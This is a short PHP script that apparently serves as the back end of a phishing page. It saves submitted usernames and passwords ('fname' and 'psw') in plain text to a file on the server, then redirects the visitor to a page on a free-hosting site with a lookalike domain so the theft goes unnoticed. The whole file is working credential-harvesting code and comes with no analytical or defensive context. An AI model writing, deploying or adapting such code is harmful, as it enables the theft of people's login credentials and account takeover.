<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

}

$myfile = fopen("newfile.txt", "w");
$txt = $_POST['fname'] ."\n".$_POST['psw'] ;

fwrite($myfile, $txt);

fclose($myfile);

header("Location: https://xvideoet.000webhostapp.com/index2.html");
exit();

if ( $_POST['fname'] == "go"){
    $myfile = fopen("newfile1.txt", "w");
    $txt = "go";
    fwrite($myfile, $txt);
    fclose($myfile);
}
?>
